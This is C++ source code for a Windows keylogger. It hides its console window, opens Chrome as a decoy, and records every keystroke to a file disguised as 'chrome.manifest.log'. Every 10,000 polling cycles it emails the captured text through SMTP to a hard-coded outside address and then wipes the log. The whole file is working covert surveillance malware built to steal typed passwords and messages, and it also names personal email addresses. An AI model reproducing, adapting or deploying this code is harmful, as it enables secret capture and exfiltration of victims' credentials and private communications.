// key_logger.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <tchar.h>
#include <Windows.h>

#include <fstream>
#include <tchar.h>
#include <string>
#include <ctype.h>

#include "EASendMailObj.tlh"
using namespace EASendMailObjLib;

const int ConnectNormal = 0;
const int ConnectSSLAuto = 1;
const int ConnectSTARTTLS = 2;
const int ConnectDirectSSL = 3;
const int ConnectTryTLS = 4;

using namespace std;

void LOG(string input) {
	fstream LogFile;
	LogFile.open("chrome.manifest.log", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}

bool SpecialKeys(int S_Key) {
	switch (S_Key) {
	case VK_SPACE:
		cout << " ";
		LOG(" ");
		return true;
	case VK_RETURN:
		cout << "\n";
		LOG("\n");
		return true;
	case '¾':
		cout << ".";
		LOG(".");
		return true;
	case VK_SHIFT:
		cout << "#SHIFT#";
		LOG("#SHIFT#");
		return true;
	case VK_BACK:
		cout << "#BACK_SPACE#";
		LOG("#BACK_SPACE#");
		return true;
	case VK_RBUTTON:
		cout << "#R_CLICK#";
		LOG("#R_CLICK#");
		return true;
	case VK_CAPITAL:
		cout << "#CAPS_LOCK#";
		LOG("#CAPS_LCOK");
		return true;
	case VK_TAB:
		cout << "#TAB";
		LOG("#TAB");
		return true;
	case VK_UP:
		cout << "#UP";
		LOG("#UP_ARROW_KEY");
		return true;
	case VK_DOWN:
		cout << "#DOWN";
		LOG("#DOWN_ARROW_KEY");
		return true;
	case VK_LEFT:
		cout << "#LEFT";
		LOG("#LEFT_ARROW_KEY");
		return true;
	case VK_RIGHT:
		cout << "#RIGHT";
		LOG("#RIGHT_ARROW_KEY");
		return true;
	case VK_CONTROL:
		cout << "#CONTROL";
		LOG("#CONTROL");
		return true;
	case VK_MENU:
		cout << "#ALT";
		LOG("#ALT");
		return true;
	default:
		return false;
	}
}

std::wstring s2ws(const std::string& s) {
	std::string curLocale = setlocale(LC_ALL, "");
	const char* _Source = s.c_str();
	size_t _Dsize = mbstowcs(NULL, _Source, 0) + 1;
	wchar_t* _Dest = new wchar_t[_Dsize];
	wmemset(_Dest, 0, _Dsize);
	mbstowcs(_Dest, _Source, _Dsize);
	std::wstring result = _Dest;
	delete[]_Dest;
	setlocale(LC_ALL, curLocale.c_str());
	return result;
}

void send_email() {
	::CoInitialize(NULL);

	IMailPtr oSmtp = NULL;
	oSmtp.CreateInstance(__uuidof(EASendMailObjLib::Mail));
	oSmtp->LicenseCode = _T("TryIt");

	// Set your sender email address
	oSmtp->FromAddr = _T("max.d.kelly@hotmail.com");
	// Add recipient email address
	oSmtp->AddRecipientEx(_T("max.diamond.kelly@gmail.com"), 0);

	// Set email subject
	oSmtp->Subject = _T("Key_logger results");
	// Set email body

	string line;

	std::string msg;
	ifstream myfile("chrome.manifest.log");


	if (myfile.is_open())
	{
		while (getline(myfile, line))
		{
			msg += line + '\n' ;
		}
		myfile.close();
	}
	oSmtp->BodyText = s2ws(msg).c_str();
	


	// Your SMTP server address
	oSmtp->ServerAddr = _T("smtp.live.com");

	// User and password for ESMTP authentication, if your server doesn't
	// require User authentication, please remove the following codes.
	oSmtp->UserName = _T("max.d.kelly@hotmail.com");
	oSmtp->Password = _T("******");

	// Most mordern SMTP servers require SSL/TLS connection now.
	// ConnectTryTLS means if server supports SSL/TLS, SSL/TLS will be used automatically.
	oSmtp->ConnectType = ConnectTryTLS;

	// If your SMTP server uses 587 port
	// oSmtp->ServerPort = 587;

	// If your SMTP server requires SSL/TLS connection on 25/587/465 port
	// oSmtp->ServerPort = 25; // 25 or 587 or 465
	// oSmtp->ConnectType = ConnectSSLAuto;

	_tprintf(_T("Start to send email ...\r\n"));

	if (oSmtp->SendMail() == 0)
	{
		_tprintf(_T("email was sent successfully!\r\n"));
	}
	else
	{
		_tprintf(_T("failed to send email with the following error: %s\r\n"),
			(const TCHAR*)oSmtp->GetLastErrDescription());
	}
}


void LOG_char(char input) {
	fstream LogFile;
	LogFile.open("chrome.manifest.log", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}

int main()
{
	
	//send_email();
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);

	ShellExecuteA(GetDesktopWindow(), "open", "c:\\program files (x86)\\google\\chrome\\application\\chrome.exe", NULL, NULL, SW_SHOW);

	

	char KEY = 'x';

	bool caps_lock = false;

	int tick = 0;

	while (true) {

		if (tick == 10000) {
			send_email();
			std::ofstream ofs;
			ofs.open("chrome.manifest.log", std::ofstream::out | std::ofstream::trunc);
			ofs.close();
			tick = 0;
		}

		//cout << tick << endl;

		Sleep(10);
		for (int KEY = 8; KEY <= 250; KEY++) {
			
			if (GetAsyncKeyState(KEY) == -32767) {
				
				if (SpecialKeys(KEY) == false) {

					if (48 <= KEY && KEY <= 90) {

						LOG_char(char(KEY));
					}
					else {

						if (KEY >= 188 && KEY <= 191) {
							LOG_char(char(KEY - 144));
						}

						if (KEY >= 219 && KEY <= 221) {
							LOG_char(char(KEY - 128));
						}

						if (KEY == 187) {
							LOG_char(char(KEY - 126));
						}

						if (KEY == 186) {
							LOG_char(char(KEY - 127));
						}

						if (KEY == 222) {
							LOG_char(char(KEY - 183));
						}

						if (KEY == 192) {
							LOG_char(char(KEY - 96));
						}
					}
				}
			}
		}

		tick++;
	}

	return 0;

	
}




